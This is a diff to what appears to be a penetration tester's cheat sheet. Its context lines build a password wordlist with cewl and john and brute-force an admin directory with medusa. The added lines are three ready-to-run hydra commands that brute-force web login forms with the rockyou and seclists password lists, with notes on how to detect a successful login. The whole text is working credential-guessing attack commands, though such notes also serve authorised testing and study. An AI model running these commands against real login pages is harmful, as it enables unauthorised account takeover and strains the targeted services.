@@ -110,4 +110,9 @@ cewl -w cewl"$1" -d 9 -m 5 "$1" -w cewl.txt
 john --wordlist=cewl.txt --rules --stdout > cewl-mangled
 cat cewl-mangled | wc -l
 medusa -h admin.megacorpone.com -u admin -P cewl-mangled -M http -n 81 -m DIR:/admin -T 30
-
+hydra -l username -P rockyou.txt website.dom http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:S=302"
+	--http form post success response code
+hydra -l username -P rockyou.txt website.dom http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:invalid."
+	--http form post non-error(200) response
+hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt -e ns  -F  -u  -t 1  -w 10  -v  -V  target.dom  http-get-form "/path/to/target.cgi:username=^USER^&password=^PASS^&Login=Login:S=Welcome"
+	--http form get success response
